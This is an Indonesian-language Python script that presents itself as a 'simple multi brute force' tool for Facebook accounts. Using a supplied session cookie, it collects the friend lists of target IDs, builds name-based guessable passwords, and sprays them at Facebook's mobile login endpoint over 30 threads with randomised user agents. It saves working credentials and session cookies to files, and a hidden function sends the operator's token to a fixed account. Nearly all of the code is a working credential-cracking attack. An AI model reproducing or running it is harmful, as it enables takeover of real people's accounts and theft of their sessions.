#-----------------[ IMPORT-MODULE ]-------------------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")
#-----------------[ IMPORT-MODULE ]-------------------#
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
#------------------[ GLOBAL NAMA ]-------------------#
angela, angela2 = [],[]
id, id2, uid = [],[],[]
ualu, ualuh = [], []
pwpluss, pwnya = [],[]
method, lisensiku = [],[]
tokenku, lisensikuni = [],[]
cokbrut=[]
fields=[]
ses=requests.Session()
princp=[]
loop, ok, cp = 0,0,0
#------------------[ PROXY ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(f'{clr}[{tlr}■{clr}]{B} Onani')
prox=open('.prox.txt','r').read().splitlines()
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			usragen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------------[ USER-AGENT ]-------------------#
for i_am in range(10000):
	rc, rr =random.choice, random.randrange
	a = "Mozilla/5.0 (Linux; Android"
	b = random.choice(["8","9","10","11","12","13","14"])
	c = random.choice(["Qin 1s+","Qin 2","Qin 2 Pro","Qin 3 Ultra","Qin 1s","Red RICE7","Redmi 01A","Redmi 1","Redmi 10","Redmi 11","Redmi 12","Redmi 1S","Redmi 2","Redmi 3X","Redmi 4A","Redmi 5 Plus","Redmi 6 Pro Extreme","Redmi 7i","Redmi 8","Hongmi","Hongmi 4G","Hongmi 2 4G","Hongmi Note 1TD","Redmi A1","Mi 10S","Civi 1S"])
	d = "Build/UP1A.231005.007)"
	e = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
	f = random.randrange(114,124)
	g = "0"
	h = random.randrange(5200,6900)
	i = random.randrange(73,150)
	j = "Mobile Safari/537.36"
	atomic = f"{a} {b}; {c} {d} {e}{f}.{g}.{h}.{i} {j}"
	angela.append(atomic)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
OO = '\x1b[38;5;208m'
sir = '\ 033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
o = '\x1b[38;5;208m' # OREN +
asu = random.choice([M,K,H,U,B,O,P,b])
clr = random.choice([U,H]) 
tlr = random.choice([P,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def _____animasi__berjalan_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	print(f'''\t{clr}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {tlr}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {P} SIMPLE MULTI BRUTE FORCE
''')
 
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
                
def login_lagi334():
	try:
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f' {clr}[{tlr}■{clr}]{P} Masukkan Cookies {P}:{b} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.7',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/94.0.0.0 Mobile Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate, br',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f' {clr}[{tlr}■{clr}]{P} Login Berhasil ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f' {clr}[{tlr}■{clr}]{P} Login Gagal '%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[Ã—] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f' {clr}[{tlr}■{clr}]{P} Nick :{b} {my_name}')
	print(f' {clr}[{tlr}■{clr}]{P} ID   :{b} {my_id}')
	print(f' {clr}[{tlr}■{clr}]{P} IP   :{b} {ip}')
	print(f'\n {clr}[{tlr}1{clr}]{P} Crack ')
	print(f' {clr}[{tlr}0{clr}]{P} Go Out       ')
	_____alvino__adijaya_____ = input(f'\n {clr}[{tlr}■{clr}] {P}Choose :{b} ')
	if _____alvino__adijaya_____ in ['1']:
		massal()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' {clr}[{tlr}■{clr}]{P} Cookie berhasil di hapus')
		exit()
	else:
		print(f' {clr}[{tlr}■{clr}]{P} Pilih Yang Bener ')
		back()
def error():
	print(f' {clr}[{tlr}■{clr}]{P} Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-PUBLIK ]----------------#
def massal():
    idz = []
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        print(f'{m}cookies telah kadaluarsa ster')
        exit()
    try:
    	dwi = int(input(f"\n {clr}[{tlr}■{clr}]{P} masukan jumlah target : {b}"))	
    except ValueError:
        exit()
    if dwi < 1 or dwi > 1000:
        exit()
    ses = requests.Session()
    _dwi_ = 0
    for yantti in range(dwi):
        _dwi_ += 1
        Masukan = input(f" {clr}[{tlr}■{clr}]{P} masukan Id target {clr}[{tlr}{_dwi_}{clr}] {P}: {b}")
        idz.append(Masukan)
    for user in idz:
        try:
            head = (
                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
                 })
            if len(id) == 0:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            else:
                params = (
                    {
                        'access_token': token,
                        'fields': "friends"
                    }
                )
            url = requests.get('https://graph.facebook.com/{}'.format(user),
                               params=params, headers=head, cookies={'cookies': cok}).json()
            for proses in url['friends']['data']:
                try:
                    woy = (proses['id']+'|'+proses['name'])
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            exit()
    try:
    	sys.stdout.write(f"\n {clr}[{tlr}■{clr}]{P} Total ID Yang Terkumpul {b}{len(id)}{P} ID...."),
    	sys.stdout.flush()
    	setting()
    except requests.exceptions.ConnectionError:
        print(f" {P}{M}  koneksi terputus")
        exit()
    except (KeyError, IOError):
        print(f" {P}{M}  teman tidak publik")
        exit()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	print(f'\n {clr}[{tlr}1{clr}]{P} Idz Old ')
	print(f' {clr}[{tlr}2{clr}]{P} Idz New ')
	print(f' {clr}[{tlr}3{clr}]{P} Idz Random ')
	hu = input(f'\n {clr}[{tlr}■{clr}] {P}Choose :{b} ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f' {clr}[{tlr}■{clr}] Pilih Yang Bener ')
		exit()
	print(f'\n {clr}[{tlr}1{clr}]{P} Metode Validate')
	hc = input(f'\n {clr}[{tlr}■{clr}] {P}Choose :{b} ')
	if hc in ['1','01']:
		method.append('Mobile')
	else:
		method.append('Mobile')
	pwplus=input(f'\n {clr}[{tlr}■{clr}]{P} Tambahkan Password Manual ( Y/t ) : {b}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f' {clr}[{tlr}■{clr}]{P} Masukkan Password Tambahan :{b} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwordlist()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwordlist():
	print(f'\n {clr}[{tlr}■{clr}]{P} Hasil {H}OK{P} Tersimpan Di : {H}OK/%s {P}'%(okc))
	print(f' {clr}[{tlr}■{clr}]{P} Hasil {K}CP{P} Tersimpan Di : {K}CP/%s {P}\n'%(cpc))
	with tred(max_workers=30) as Onani:
		for yuzong in id2:
			idz,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				Onani.submit(Mobile,idz,pwv)
			else:
				Onani.submit(Mobile,idz,pwv)
	print('')
	print(f'\n {clr}[{tlr}■{clr}] {H}OK : {h}%s '%(ok))
	print(f' {clr}[{tlr}■{clr}] {K}CP : {k}%s '%(cp))
#------------------[ METHOD-VALIDATE ]-------------------#
def Mobile(idz,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randrange
	sys.stdout.write(f"\r {M}{loop}{P}/{U}{len(id)} {H}{ok} {P}: {K}{cp}    "), 
	sys.stdout.flush()
	ua = random.choice(angela)
	ses = requests.Session()
	url = "m.facebook.com"
	for pw in pwv:
		try:
			link = ses.get("https://m.facebook.com/login/device-based/password/?uid="+idz+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D1311483179548747%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbddcf290-5a3c-497a-920a-e457b61f38a7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={
                "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid":idz,
				"next":"https://m.facebook.com/v16.0/dialog/oauth?state=https%3A%2F%2Fsocial.yandex.com%2Fbroker2%2F0d7197f4669d47e385edd297ad1e94ab%2Fcallback&redirect_uri=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect&response_type=code&client_id=1311483179548747&scope=email%2Cuser_birthday%2Cuser_gender%2Cuser_link&display=touch&ret=login&fbapp_pres=0&logger_id=bddcf290-5a3c-497a-920a-e457b61f38a7&tp=unspecified",
				"flow":"login_no_pin",
				"pass":pw,
                         }
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
    			"Host": "m.facebook.com",
    			"content-length": f"{str(rr(699,899))}",
    			"cache-control": "max-age=0",
    			"dpr": f"{str(rr(2,5))}",
    			"viewport-width": f"{str(rr(500,999))}",
    			"sec-ch-ua": '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    			"sec-ch-ua-mobile": "?1",
    			"sec-ch-ua-platform": '"Android"',
    			"sec-ch-ua-platform-version": "",
    			"sec-ch-ua-model": "",
    			"sec-ch-ua-full-version-list": '""',
    			"sec-ch-prefers-color-scheme": "dark",
    			"upgrade-insecure-requests": "1",
    			"origin": "https://m.facebook.com",
    			"content-type": "application/x-www-form-urlencoded",
    			"user-agent": ua,
    			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    			"x-requested-with": "mark.via.gp",
    			"sec-fetch-site": "same-origin",
    			"sec-fetch-mode": "navigate",
    			"sec-fetch-user": "?1",
    			"sec-fetch-dest": "document",
    			"referer": "https://m.facebook.com/login/device-based/password/?uid="+idz+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%26redirect_uri%3Dhttps%253A%252F%252Fsocial.yandex.net%252Fbroker%252Fredirect%26response_type%3Dcode%26client_id%3D1311483179548747%26scope%3Demail%252Cuser_birthday%252Cuser_gender%252Cuser_link%26display%3Dtouch%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbddcf290-5a3c-497a-920a-e457b61f38a7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsocial.yandex.net%2Fbroker%2Fredirect%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fsocial.yandex.com%252Fbroker2%252F0d7197f4669d47e385edd297ad1e94ab%252Fcallback%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
    			"accept-encoding": "gzip, deflate, br, zstd",
    			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
						 }
			po = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r {P}■ {K}{idz}{P}|{K}{pw}')
				open('CP/'+cpc,'a').write(idz+'|'+pw+'\n')
				akun.append(idz+'='+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r {P}■ {H}{idz}{P}|{H}{pw}{P}|{H}{kuki}\n {P}└──> {H}{ua}')
				open('OK/'+okc,'a').write(idz+'='+pw+'='+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------[ CEK-OPSI ]----------#	
def ceker(idz,pw):
	global cp
	rc = random.choice
	head = {"Host": url,
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": "https://"+url,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"x-requested-with": "com.android.chrome",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idz,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{H}Tapyes / A2f ( cek di mbasic ){P}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idz+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{H}{idz}{P}").add(f"{H}{pw}{P}")
		tree.add(f"{M}spam ip tidak dapat cek ops{P}i")
		prints(tree)
		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idz+'|'+pw+'|'+'\n')
		#cp+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#